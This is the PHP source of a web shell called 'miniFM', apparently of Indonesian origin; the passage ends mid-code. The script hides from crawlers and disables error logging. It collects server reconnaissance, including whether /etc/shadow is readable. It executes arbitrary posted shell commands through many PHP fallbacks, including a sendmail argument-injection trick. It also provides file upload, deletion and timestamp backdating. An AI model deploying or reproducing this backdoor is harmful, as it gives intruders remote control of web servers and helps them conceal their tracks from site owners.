<?php
@ini_set('display_errors','Off');
@ini_set('ignore_repeated_errors',0);
@ini_set('log_errors','Off');
@ini_set('max_execution_time',0);
@ini_set('memory_limit', '128M');
@error_reporting(0);
$auth_pass = '$2y$10$u0LRXNXe3JeFZuQSrIrASu3Puc.wNLrtXWvRntANJ8h03Xfnnr4YK';
$stitle = ".:: [ miniFM ] ::.";
$webprotocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ? "https://" : "http://";
$weburl	= $webprotocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
$lokasiberkas = @getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
$os = strtolower(substr(PHP_OS,0,3)) == "win" ? 'win' : 'nix';
$chunk_size = 4096;
if(!isset($_SESSION)){session_start();}
if(!function_exists('array_column')){
	function array_column(array $input, $columnKey, $indexKey = null){
		$array = array();
		foreach($input as $value){
			if(!array_key_exists($columnKey, $value)){
				trigger_error("Key \"$columnKey\" does not exist in array");
				return false;
			}
			if(is_null($indexKey)){
				$array[] = $value[$columnKey];
			} else {
				if(!array_key_exists($indexKey, $value)){
					trigger_error("Key \"$indexKey\" does not exist in array");
					return false;
				}
				if(!is_scalar($value[$indexKey])){
					trigger_error("Key \"$indexKey\" does not contain scalar value");
					return false;
				}
				$array[$value[$indexKey]] = $value[$columnKey];
			}
		}
		return $array;
	}
}
if(!function_exists("scandir")){
	function scandir($dir) {
		$dh = @opendir($dir);
		while (false !== ($filename = @readdir($dh))){
			$files[] = $filename;
		}
		return $files;
	}
}
function blockCrawler(){
	if(!empty($_SERVER['HTTP_USER_AGENT'])){
		$ua = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
		if(preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])){
			header('HTTP/1.0 404 Not Found');
			exit(0);
		}
	}
}
function disFunc(){ $df = function_exists('ini_get') ? @ini_get('disable_functions') : ''; return (!empty($df) ? explode(',', $df) : array());}
function AvFunc($list = array()){
	foreach($list as $entry){
		if(function_exists($entry) && !in_array($entry, disFunc())){
			return true;
		}
	}
	return false;
}
function serverSecInfo(){
	function serverPanel(){
		$pn = array('/usr/local/cpanel' => 'cPanel', '/usr/local/hpanel' => 'hPanel (Hostinger)', '/usr/local/psa' => 'Plesk', '/usr/local/webuzo' => 'Webuzo', '/usr/local/vesta' => 'Vesta CP', '/usr/share/webmin' => 'Virtualmin', '/www/server/panel' => 'aaPanel', '/opt/neoistone' => 'NS Panel', '/etc/neoistone' => 'NS Panel', '/usr/local/neoistone' => 'NS Panel', '/usr/local/mgr5' => 'ISP Manager', '/usr/local/mgr6' => 'ISP Manager', '/usr/local/home/admispconfig'	=> 'ISP Config', '/usr/local/directadmin' => 'Direct Admin', '/usr/local/solusvm/www' => 'SolusVM', '/usr/local/lxlabs/kloxo' => 'Kloxo', '/usr/local/cwp' => 'CentOS WebPanel', '/usr/local/cwpsrv' => 'CentOS WebPanel', '/var/www/html/froxlor-latest' => 'Froxlor', '/var/www/html/froxlor' => 'Froxlor', '/etc/ajenti/' => 'Ajenti');
		foreach($pn as $kpn => $vpn){
			if(@is_dir($kpn)){
				$npn[] = $vpn;
			}
		}
		return isset($npn) ? implode(', ', array_values(array_unique($npn))) : 'Unknown';
	}
	function showInf($n, $v) {
		$x = '<blockquote class="blockquote p-3 bg-success-rgb rounded">';
		$v = trim($v);
		if($v){$x .= '<p class="mb-0 text-success">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer text-light">'.$v.'</footer>' : '<footer class="blockquote-footer text-light"><pre class="text-light small">'.$v.'</pre></footer>';}
		return $x.'</blockquote>';
	}
	if(AvFunc(array('mysql_get_client_info'))){$temp[] = "MySQL (" . @mysql_get_client_info(). ")";}
	if(AvFunc(array('mysqli_get_client_info'))){$temp[] = "MySQLi (" . @mysqli_get_client_info(). ")";}
	if(AvFunc(array('mssql_connect'))){$temp[] = "MSSQL";}
	if(AvFunc(array('pg_connect'))){$temp[] = "PostgreSQL";}
	if(AvFunc(array('oci_connect'))){$temp[] = "Oracle";}
	$sInfo[] = showInf('Server software', (AvFunc(array('getenv')) ? @getenv('SERVER_SOFTWARE') : 'Unknown'));
	$sInfo[] = showInf('Server ip', (AvFunc(array('gethostbyname')) ? @gethostbyname($_SERVER['HTTP_HOST']) : 'Unknown'));
	$sInfo[] = showInf('Server panel', serverPanel());
	$sInfo[] = showInf('Loaded Apache modules', (AvFunc(array('apache_get_modules')) ? implode(', ', @apache_get_modules()) : '-'));
	$sInfo[] = showInf('cURL support', (AvFunc(array('curl_version')) ? 'Yes ('.curl_version()['version'].')' : 'No'));
	$sInfo[] = showInf('Databases', (isset($temp) ? implode(', ',$temp) : 'Unknown'));
	$sInfo[] = showInf('PHP Version', @phpversion());
	$sInfo[] = showInf('Disabled PHP Functions', (count(disFunc())>0 ? implode(', ', disFunc()) : 'none'));
	$sInfo[] = showInf('Uname', @php_uname());
	if(AvFunc(array('ini_get'))){
		$sInfo[] = showInf('Open base dir', @ini_get('open_basedir'));
		$sInfo[] = showInf('Safe mode', (@ini_get('safe_mode') ? 'ON' : 'OFF'));
		$sInfo[] = showInf('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
		$sInfo[] = showInf('Safe mode include dir', @ini_get('safe_mode_include_dir'));		
	}
	if($GLOBALS['os'] == 'nix'){
		$sInfo[] = showInf('OS Version', (AvFunc(array('file_get_contents')) ? @file_get_contents('/proc/version') : 'Unknown'));
		$sInfo[] = showInf('Distro name', (AvFunc(array('file_get_contents')) ? @file_get_contents('/etc/issue.net') : 'Unknown'));
		if(AvFunc(array('is_readable'))){
			$sInfo[] = showInf('Readable /etc/passwd', (@is_readable('/etc/passwd') ? "Yes" : "No"));
			$sInfo[] = showInf('Readable /etc/shadow', (@is_readable('/etc/shadow') ? "Yes" : "No"));			
		}
	} else {
		$sInfo[] = showInf('OS Version', cmd("ver", $_SESSION['path'])['stdout']);
		if(AvFunc(array('iconv'))){
			$sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', cmd("net accounts", $_SESSION['path'])['stdout']));
			$sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', cmd("net user", $_SESSION['path'])['stdout']));
			$sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8',cmd("systeminfo", $_SESSION['path'])['stdout']));
		}
	}
	$sInfo = array_filter($sInfo, function($str){return strpos($str, '<blockquote class="blockquote p-3 bg-success-rgb rounded"></blockquote>') === false;});
	return array_values(array_filter(array_unique($sInfo)));
}
function fType($a){
	switch($a){
		case 'home' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>'; break;
		case 'dir' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 512 512"><path fill="var(--bg-icon)" d="M0 96C0 60.7 28.7 32 64 32H196.1c19.1 0 37.4 7.6 50.9 21.1L289.9 96H448c35.3 0 64 28.7 64 64V416c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V96zM64 80c-8.8 0-16 7.2-16 16V416c0 8.8 7.2 16 16 16H448c8.8 0 16-7.2 16-16V160c0-8.8-7.2-16-16-16H286.6c-10.6 0-20.8-4.2-28.3-11.7L213.1 87c-4.5-4.5-10.6-7-17-7H64z"/></svg>'; break;
		case 'file' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 384 512"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>'; break;
		case 'info' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 16 16"><path fill="var(--bg-icon)" d="M8,0 C12.4183,0 16,3.58173 16,8 C16,12.4183 12.4183,16 8,16 C3.58167,16 0,12.4183 0,8 C0,3.58173 3.58167,0 8,0 Z M8,2 C4.68628,2 2,4.68628 2,8 C2,11.3137 4.68628,14 8,14 C11.3137,14 14,11.3137 14,8 C14,4.68628 11.3137,2 8,2 Z M8,7 C8.51280357,7 8.93550255,7.38604429 8.99327177,7.88337975 L9,8 L9,11 C9,11.5523 8.55225,12 8,12 C7.48719643,12 7.06449745,11.613973 7.00672823,11.1166239 L7,11 L7,8 C7,7.44772 7.44775,7 8,7 Z M8,4 C8.55225,4 9,4.44772 9,5 C9,5.55228 8.55225,6 8,6 C7.44775,6 7,5.55228 7,5 C7,4.44772 7.44775,4 8,4 Z"/></svg>'; break;
		case 'edit' : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="1.2em" viewBox="0 0 348.882 348.882"><path fill="var(--warning)" d="M333.988,11.758l-0.42-0.383C325.538,4.04,315.129,0,304.258,0c-12.187,0-23.888,5.159-32.104,14.153L116.803,184.231 c-1.416,1.55-2.49,3.379-3.154,5.37l-18.267,54.762c-2.112,6.331-1.052,13.333,2.835,18.729c3.918,5.438,10.23,8.685,16.886,8.685 c0,0,0.001,0,0.001,0c2.879,0,5.693-0.592,8.362-1.76l52.89-23.138c1.923-0.841,3.648-2.076,5.063-3.626L336.771,73.176 C352.937,55.479,351.69,27.929,333.988,11.758z M130.381,234.247l10.719-32.134l0.904-0.99l20.316,18.556l-0.904,0.99 L130.381,234.247z M314.621,52.943L182.553,197.53l-20.316-18.556L294.305,34.386c2.583-2.828,6.118-4.386,9.954-4.386 c3.365,0,6.588,1.252,9.082,3.53l0.419,0.383C319.244,38.922,319.63,47.459,314.621,52.943z"/><path fill="var(--info)" d="M303.85,138.388c-8.284,0-15,6.716-15,15v127.347c0,21.034-17.113,38.147-38.147,38.147H68.904 c-21.035,0-38.147-17.113-38.147-38.147V100.413c0-21.034,17.113-38.147,38.147-38.147h131.587c8.284,0,15-6.716,15-15 s-6.716-15-15-15H68.904c-37.577,0-68.147,30.571-68.147,68.147v180.321c0,37.576,30.571,68.147,68.147,68.147h181.798 c37.576,0,68.147-30.571,68.147-68.147V153.388C318.85,145.104,312.134,138.388,303.85,138.388z"/></svg>'; break;
		default : $b = '<svg xmlns="http://www.w3.org/2000/svg" height="2em" viewBox="0 0 384 512"><path fill="var(--bg-icon)" d="M64 464c-8.8 0-16-7.2-16-16V64c0-8.8 7.2-16 16-16H224v80c0 17.7 14.3 32 32 32h80V448c0 8.8-7.2 16-16 16H64zM64 0C28.7 0 0 28.7 0 64V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V154.5c0-17-6.7-33.3-18.7-45.3L274.7 18.7C262.7 6.7 246.5 0 229.5 0H64zm56 256c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24H264c13.3 0 24-10.7 24-24s-10.7-24-24-24H120z"/></svg>';
	}
	return $b;
}
function procopen($cmd){
	$descspek = array(
		1 => array("pipe", "w"),
		0 => array("pipe", "r"),
		2 => array("pipe", "w")
	);
	try {
		if(AvFunc(array('proc_open','proc_close','fread','feof','fclose'))){
			$process = @proc_open($cmd, $descspek, $pipes);
			if(is_resource($process)){
				$stdout = ""; $buffer = "";
				do {
					$buffer = fread($pipes[1], $GLOBALS['chunk_size']);
					$stdout = $stdout . $buffer;
				} while ((!feof($pipes[1])) && (strlen($buffer) != 0));
				$stderr = ""; $buffer = "";
				do {
					$buffer = fread($pipes[2], $GLOBALS['chunk_size']);
					$stderr = $stderr . $buffer;
				} while ((!feof($pipes[2])) && (strlen($buffer) != 0));
				fclose($pipes[1]);
				fclose($pipes[2]);
				$outr = !empty($stdout) ? $stdout : $stderr;
			} else {
				$outr = 'Gagal eksekusi pak!, proc_open failed!';
			}
			proc_close($process);
		} else {
			$outr = 'PHP proc_open function is disabled or no exists!';
		}
		echo $outr;
	} catch(Exception $err){
		echo 'error: '.$err->getMessage();
	}
}
function fakemail($func, $cmd){
	$cmds = "{$cmd} > geiss.txt";
	cf('geiss.sh', base64_encode(@iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("#!/bin/sh\n{$cmds}","\r\t\0"))));
	@chmod('geiss.sh', 0777);
	if($func == 'mail'){
		$send = @mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
	} else {
		$send = @mb_send_mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
	}
	if($send){sleep(5);}
	return @file_get_contents("geiss.txt");
}
function cf($f,$t){
	if(AvFunc(array('fopen','fwrite','fputs','fclose'))){
		$w=@fopen($f,"w");
		if($w){
			@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t));
			@fclose($w);
		}		
	} else {
		if(AvFunc(array('file_put_contents'))){
			@file_put_contents($f,@base64_decode($t));
		}		
	}
}
function expandPath($path) {
    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        cmd("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}
function cmd($cmdx, $path){
    $stdout = '';
	if(!preg_match('/2>/', $cmdx)){$cmdx.=' 2>&1';}
	if(AvFunc(array('chdir'))){
		if(preg_match("/^\s*cd\s*(2>&1)?$/", $cmdx)){
			@chdir(expandPath("~"));
		} else if(preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmdx)){
			@chdir($path);
			preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmdx, $match);
			@chdir(expandPath($match[1]));
		} else {
			@chdir($path);
			$stdout = ex($cmdx);
		}
	}
	$_SESSION['path'] = AvFunc(array('getcwd')) ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT'];
    return array('stdout' => $stdout, 'path' => $_SESSION['path']);
}
function ex($init){
	$out = '';
	$arrCmd = array('proc_open', 'popen', 'exec', 'passthru', 'system', 'shell_exec', 'mail', 'mb_send_mail');
	$tmpout = `$init`;
	if(strlen($tmpout)>0){
		$out = $tmpout;
	} else {
		foreach($arrCmd as $c){
			if($c == 'proc_open'){
				if(AvFunc(array($c, 'ob_start', 'ob_get_clean'))){ob_start(); procopen($init); $out=ob_get_clean();}
			} else if($c == 'exec'){
				if(AvFunc(array($c))){@$c($init,$outs); $out=@join("\n",$outs);}
			} else if($c == 'system' || $c == 'passthru'){
				if(AvFunc(array('system', 'passthru', 'ob_start', 'ob_get_clean'))){ob_start(); @$c($init); $out=ob_get_clean();}
			} else if($c == 'shell_exec'){
				if(AvFunc(array($c))){$out=$c($init);					}
			} else if($c == 'mail' || $c == 'mb_send_mail'){
				if(AvFunc(array('mail', 'mb_send_mail', 'ob_start', 'ob_get_clean'))){ob_start(); fakemail("{$c}",$init); $out=ob_get_clean();}
			} else {
				if(AvFunc(array($c, 'feof', 'fread', 'fclose'))){if(is_resource($f = @$c($init, "r"))){$out=''; while(!@feof($f)){$out.=fread($f, $GLOBALS['chunk_size']);}fclose($f);}}
			}
			if(strlen($out)>0){ break; } else { continue; }
		}
	}
	return $out;
}
function statusnya($file){
	$stx = @fileperms($file);
	if(($stx & 0xC000) == 0xC000){ $info = 's'; /* Socket */ }
	elseif(($stx & 0xA000) == 0xA000){ $info = 'l'; /* Symbolic Link */ }
	elseif(($stx & 0x8000) == 0x8000){ $info = '-'; /* Regular */ }
	elseif(($stx & 0x6000) == 0x6000){ $info = 'b'; /* Block special */ }
	elseif(($stx & 0x4000) == 0x4000){ $info = 'd'; /* Directory */ }
	elseif(($stx & 0x2000) == 0x2000){ $info = 'c'; /* Character special */ }
	elseif(($stx & 0x1000) == 0x1000){ $info = 'p'; /* FIFO pipe */ }
	else { $info = 'u'; /* Unknown */ }
	/* Owner */
	$info .= ($stx & 0x0100) ? 'r' : '-';
	$info .= ($stx & 0x0080) ? 'w' : '-';
	$info .= (($stx & 0x0040) ? (($stx & 0x0800) ? 's' : 'x' ) : (($stx & 0x0800) ? 'S' : '-'));
	/* Group */
	$info .= ($stx & 0x0020) ? 'r' : '-';
	$info .= ($stx & 0x0010) ? 'w' : '-';
	$info .= (($stx & 0x0008) ? (($stx & 0x0400) ? 's' : 'x' ) : (($stx & 0x0400) ? 'S' : '-'));
	/* World */
	$info .= ($stx & 0x0004) ? 'r' : '-';
	$info .= ($stx & 0x0002) ? 'w' : '-';
	$info .= (($stx & 0x0001) ? (($stx & 0x0200) ? 't' : 'x' ) : (($stx & 0x0200) ? 'T' : '-'));
	return $info;
}
function stColor($f){$colors = '';if(!@is_readable($f)){$colors = 'text-danger';} else if(!@is_writable($f)){$colors = 'text-warning';} else {$colors = 'text-success';}return $colors;}
function owner($filename){
	$owner = AvFunc(array('fileowner')) ? @fileowner($filename) : '?';
	$group = AvFunc(array('filegroup')) ? @filegroup($filename) : '?';
	if(AvFunc(array('posix_getpwuid'))){
		$owner = @posix_getpwuid($owner);
		$owner = isset($owner['name']) ? $owner['name'] : '?';
	}
	if(AvFunc(array('posix_getgrgid'))){
		$group = @posix_getgrgid($group);
		$group = isset($group['name']) ? $group['name'] : '?';
	}
	return array('owner' => $owner, 'group' => $group);
}
function sizeFilter($bytes){
    $label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');
    for($i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++);
    return(round($bytes, 2) . " " . $label[$i]);
}
function countDir($filename){return @count(@scandir($filename)) - 2;}
function xrmdir($dir){
	$items = @scandir($dir);
	if($items){
		foreach($items as $item) {
			if($item === '.' || $item === '..'){
				continue;
			}
			$path = $dir.'/'.$item;
			if(@is_dir($path)){
				xrmdir($path);
			} else {
				@unlink($path);
			}
		}
		rmdir($dir);
	}
}
function urutberkas($a){
	$b = @scandir($a);
	$i = array();
	if(is_array($b) && count($b)>0){
		foreach($b as $v){
			$dir = $a.'/'.$v;
			if(@is_dir($dir) && !in_array($v, array('.', '..'))){
				$i[] = array('type' => 'dir', 'entry' => $v, 'entry_path' => $a, 'full_path' => $dir);
			} else {
				if(!in_array($v, array('.', '..'))){
					$i[] = array('type' => 'file', 'entry' => $v, 'entry_path' => $a, 'full_path'=> $dir);
				}
			}
		}
		$col1 = array_column($i, 'type');
		$col2 = array_column($i, 'entry');
		array_multisort($col1, SORT_ASC, $col2, SORT_ASC, $i);
	}
	return $i;
}
function pathberkas($a){
	$lb = explode('/', $a);
	if(isset($lb) && count($lb)>0){
		$outs = '<nav aria-label="breadcrumb" class="d-flex justify-content-center align-items-center mt-n3">';
		$outs .= '<button id="ffmanager" class="border-0 bg-transparent d-block text-success mr-2 px-1" data-path="'.(@getcwd() ? str_replace('\\','/', @getcwd()) : $_SERVER['DOCUMENT_ROOT']).'">'.fType("home").'</button>';
		$outs .= '<ol class="breadcrumb w-100" style="margin-top:revert; padding-right:0;">';
		foreach($lb as $id => $lok){
			if($lok == '' && $id == 0){
				$link = true;
				$outs .= '<li class="breadcrumb-item"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="/">~$</a></li>';
				continue;
			}
			if($lok == ''){continue;}
			$outs .= '<li class="breadcrumb-item dir'.$id.'"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="';
			for($i=0;$i<=$id;$i++){
				$outs .= $lb[$i];
				if($i != $id){
					$outs .= '/';
				}
			}
			$outs .= '">'.$lok.'</a></li>';
		}
		$outs .= '<li class="ml-auto"><a href="javascript:void(0);" id="chdir" data-path="'.$_SESSION['path'].'">'.fType("edit").'</a></li>';
		$outs .= "</ol></nav>";
	} else {
		$outs = "<code>gak bisa baca direktori ini gess..</code>";
	}
	return $outs;
}
function filemanager($fm){
	$lokasinya = urutberkas($fm);
	$fmtable = "<div class='d-block'>".pathberkas($fm)."</div><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th class='text-left' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Perm</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
	if(count($lokasinya)>0){
		foreach($lokasinya as $kl => $dir){
			$owner = owner($dir['full_path']);
			$fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(@filesize($dir['full_path']));
			if($dir['type'] == 'dir'){
				$txcol = stColor($dir['full_path']);
				$dlinks = !is_readable($dir['full_path']) ? '-' : "<a href='#!' class='{$txcol}' id='fxmanager' data-path='{$dir['full_path']}'>{$dir['entry']}</a>";
				$zadd = '';
				if(class_exists('ZipArchive')){
					$zadd .= "<option value='zip' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";
				}
				if(!in_array($dir['entry'], array('.', '..'))){
					$formper = "<a href='#' class='{$txcol}' data-toggle='modal' data-target='#showchmod' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
					$formsel = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='rename' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', filemtime($dir['full_path']))."'>touch</option>{$zadd}<option value='del' data-xtype='dir' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>";
				} else {
					$formper = statusnya($dir['full_path']);					
					$formsel = "";
				}
				$fmtable .= "<tr>
					<td class='text-left align-middle'>
						<div class='media dir'>".fType('dir')."<div class='media-body'>{$dlinks}<span class='fsmall'>{$fSize}</span></div></div>
					</td>
					<td class='text-center align-middle'>".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."</td>
					<td class='text-center align-middle'>{$owner['owner']}/{$owner['group']}</td>
					<td class='text-center align-middle'>{$formper}</td>
					<td class='text-center align-middle'>{$formsel}</td>
				</tr>";
			} else {
				$fcolor = stColor($dir['full_path']);
				$flinks = !is_readable($dir['full_path']) ? '-' : "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>";
				$zadd = '';
				if(class_exists('ZipArchive')){
					$zadd .= "<option value='zip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>zip</option>";						
					$fnm = explode('.',$dir['entry']);
					if(strtolower(ucwords(end($fnm))) == 'zip'){
						$zadd .= "<option value='unzip' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>unzip</option>";						
					}
				}
				$fmtable .= "<tr>
					<td class='text-left align-middle'>
						<div class='media file'>".fType('file')."<div class='media-body'>{$dir['entry']}<span class='fsmall'>{$fSize}</span></div></div>
					</td>
					<td class='text-center align-middle'>".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."</td>
					<td class='text-center align-middle'>{$owner['owner']}/{$owner['group']}</td>
					<td class='text-center align-middle'>{$flinks}</td>
					<td class='text-center align-middle'><select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option><option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option><option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."'>touch</option><option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option>{$zadd}<option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select></td>
				</tr>";
			}
		}
	} else {
		$fmtable .= "<tr><td class='text-center' colspan='5'>Direktori tidak berisi file apapun</td></tr>";
	}
	$fmtable .= "</tbody></table></div>";
	return $fmtable;
}
if(isset($_GET['act'])){
	if($_GET['act'] == 'info'){
		header("Content-type: application/json; charset=utf-8");
		echo json_encode((object) serverSecInfo());
		die();
	} else if($_GET['act'] == 'command'){
		if(isset($_POST['cmd'])){
			if(!empty($_POST['cmd']) || strlen($_POST['cmd'])>1){
				$sendreq = cmd($_POST['cmd'], $_POST['xpath']);
				$outs['stdout'] = "<pre class='pb-0 mb-0'>". @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("~$ ".$_POST['cmd'] . "<br/>" . htmlspecialchars($sendreq['stdout'])."","\t\0"))."</pre>";
				$outs['path'] = $sendreq['path'];
			} else {
				$outs['stdout'] = "<pre class='pb-0 mb-0'>Sebenernya, apa sih yang anda perintahkan?</pre>";
				$outs['path'] = $_SESSION['path'];
			}
			header("Content-type: application/json; charset=utf-8");
			echo json_encode($outs);
			clearstatcache();
			die();
		}
	} else if($_GET['act'] == 'mkdir'){
		$ndir = isset($_POST['xdir']) && !empty($_POST['xdir']) ? $_POST['xdir'] : '';
		if(!empty($ndir)){
			$xpath = $_POST['xpath']."/".$ndir;
			if($_POST['xtype'] == 'dir'){
				if(!is_dir($xpath)){
					if(@mkdir($xpath, 0755, true)){
						$outs = "Direktori berhasil dibuat!";
					} else {
						$sendreq = cmd("mkdir ".$xpath, $_POST['xpath']);
						$outs = @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes($sendreq['stdout'])) ? "Direktori berhasil dibuat!" : "Gagal membuat direktori!";
					}
				} else {
					$outs = "Direktori sudah ada!";
				}
			} else {
				if($_POST['xtype'] == 'file'){
					if(!file_exists($xpath)){
						if(AvFunc(array('fopen','fclose'))){
							$fp = @fopen($xpath, 'w');
							if($fp){
								$xpath = "ok, tinggal di edit..";
								fclose($fp);
							}
							$outs = "File berhasil dibuat!";
						} else if(AvFunc(array('file_put_contents'))){
							file_put_contents($xpath, "");
							$outs = file_exists($xpath) ? "File berhasil dibuat!" : "Gagal membuat file!";
						}
					} else {
						$outs = "File sudah ada, cobalah membuat file dengan nama yang berbeda!";
					}
				} else {
					$outs = "Anda mw buat apa??";
				}
			}
		} else {
			$outs = "Path tidak valid!";
		}
		echo $outs;
		die();
	} else if($_GET['act'] == 'readfile'){
		if(isset($_POST['xpath']) && !empty($_POST['xpath'])){
			$xpath = $_POST['xpath'];
			if(@is_readable($xpath)){
				$outs = '';
				if(filesize($xpath)>0){
					if(AvFunc(array('fopen','fread','fclose','feof'))){
						$fp = @fopen($xpath, 'r');
						if($fp){
							while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}
							@fclose($fp);
						}
					} else if(AvFunc(array('file_get_contents'))){
						$outs = @file_get_contents($df);
					} else {
						$outs = "File {$_GET['entry']} gak bisa dibaca!";
					}
				} else {
					if(AvFunc(array('file_get_contents'))){$outs = @file_get_contents($df);}
				}
			} else {
				$outs = "File {$_GET['entry']} gak bisa dibaca!";
			}
		} else {
			$outs = "File yang mw dibaca, gk ada!";
		}
		echo $outs;
		die();
	} else if($_GET['act'] == 'upload'){
		@ini_set('output_buffering', 0);
		$xpath = $_POST['xpath'];
		for($cf=0; $cf<count(@$_FILES['xfile']['name']); $cf++){
			if(isset($_FILES['xfile']['name'][$cf]) && @$_FILES['xfile']['name'][$cf] != null){
				$fname = @$_FILES['xfile']['name'][$cf];
				$upfiles = @file_put_contents($xpath."/".$fname, @file_get_contents(@$_FILES['xfile']['tmp_name'][$cf]));
				if($upfiles){
					$outs[] = file_exists($xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
				} else {
					$outs[] = $fname." failed!";
				}
			}
		}
		echo isset($outs) ? implode('<br/>', $outs) : 'Invalid file!';
		die();
	} else if($_GET['act'] == 'rename'){
		if(isset($_POST['xtype'], $_POST['xpath'], $_POST['xname'], $_POST['oname'])){
			$ren = @rename($_POST['xpath'].'/'.$_POST['oname'], $_POST['xpath'].'/'.$_POST['xname']);
			$outss = $ren == true ? 'Berhasil mengubah nama '.$_POST['xtype'] : 'Gagal mengubah nama '.$_POST['xtype'];
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'touch'){
		if(isset($_POST['xtype'], $_POST['xpath'], $_POST['xname'], $_POST['xtime'])){
			$time = strtotime($_POST['xtime']);
			$fd = $_POST['xpath'].'/'.$_POST['xname'];
			if($time){
				$outs = !touch($fd, $time, $time) ? 'Fail!' : 'Touched!';
			} else {
				$outs = 'Format waktu tidak valid!';
			}
			clearstatcache();
			echo $outs;
			die();
		}
